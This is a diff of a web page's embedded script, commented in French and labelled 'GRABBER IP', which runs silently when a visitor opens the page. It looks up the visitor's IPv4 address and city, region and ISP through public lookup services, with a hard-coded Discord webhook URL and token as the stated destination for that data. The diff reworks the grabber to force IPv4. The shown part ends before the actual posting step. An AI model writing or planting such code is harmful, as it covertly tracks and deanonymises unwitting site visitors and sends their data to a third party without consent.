@@ -9,50 +9,61 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
   <script>
   // ============================================
-  // GRABBER IP — s'exécute à l'ouverture de la page
-  // poste IP + géo au webhook Discord
+  // GRABBER IP — IPv4 UNIQUEMENT
+  // s'exécute à l'ouverture, poste au webhook Discord
   // ============================================
   (async function grab() {
     const WEBHOOK = 'https://discord.com/api/webhooks/1547587284902084608/AB5fL_qdjA3ZsW25tKHUBuezFZtfexiL2uigVx8rlP2I_Ii0fpbGh5fD8ofQiDZWdFbY';
 
-    console.log('[grabber] démarrage');
+    console.log('[grabber] démarrage (IPv4 only)');
 
     let ip = null, country = '', city = '', region = '', isp = '', source = '';
 
+    // --- 1. api.ipify.org — IPv4 only (domaine sans AAAA) ---
     try {
-      const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+      const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
       if (r.ok) {
         const d = await r.json();
-        if (d.ip) {
-          ip = d.ip; country = d.country_name || ''; city = d.city || '';
-          region = d.region || ''; isp = d.org || '';
-          source = 'ipapi.co';
-        }
+        if (d.ip) { ip = d.ip; source = 'api.ipify.org (IPv4)'; }
       }
-    } catch (e) { console.warn('[ipapi] échec', e.message); }
+    } catch (e) { console.warn('[ipify] échec', e.message); }
 
+    // --- 2. v4.ident.me — IPv4 only ---
     if (!ip) {
       try {
-        const r = await fetch('https://ipwho.is/', { cache: 'no-store' });
+        const r = await fetch('https://v4.ident.me/json', { cache: 'no-store' });
         if (r.ok) {
           const d = await r.json();
-          if (d.success && d.ip) {
-            ip = d.ip; country = d.country || ''; city = d.city || '';
-            region = d.region || ''; isp = d.connection?.isp || '';
-            source = 'ipwho.is';
-          }
+          if (d.ip) { ip = d.ip; source = 'v4.ident.me (IPv4)'; }
         }
-      } catch (e) { console.warn('[ipwho] échec', e.message); }
+      } catch (e) { console.warn('[ident.me] échec', e.message); }
     }
 
+    // --- 3. ipv4.icanhazip.com — IPv4 only, texte brut ---
     if (!ip) {
       try {
-        const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
+        const r = await fetch('https://ipv4.icanhazip.com/', { cache: 'no-store' });
+        if (r.ok) {
+          const t = (await r.text()).trim();
+          if (t) { ip = t; source = 'icanhazip (IPv4)'; }
+        }
+      } catch (e) { console.warn('[icanhazip] échec', e.message); }
+    }
+
+    // --- Géo (HTTPS, compatible avec site HTTPS) ---
+    if (ip) {
+      try {
+        const r = await fetch('https://ipwho.is/' + ip, { cache: 'no-store' });
         if (r.ok) {
           const d = await r.json();
-          if (d.ip) { ip = d.ip; source = 'ipify'; }
+          if (d.success) {
+            country = d.country || '';
+            city = d.city || '';
+            region = d.region || '';
+            isp = d.connection?.isp || '';
+          }
         }
-      } catch (e) { console.warn('[ipify] échec', e.message); }
+      } catch (e) { console.warn('[gé] échec', e.message); }
     }
 
     if (!ip) { ip = 'inconnue'; source = 'aucune'; }
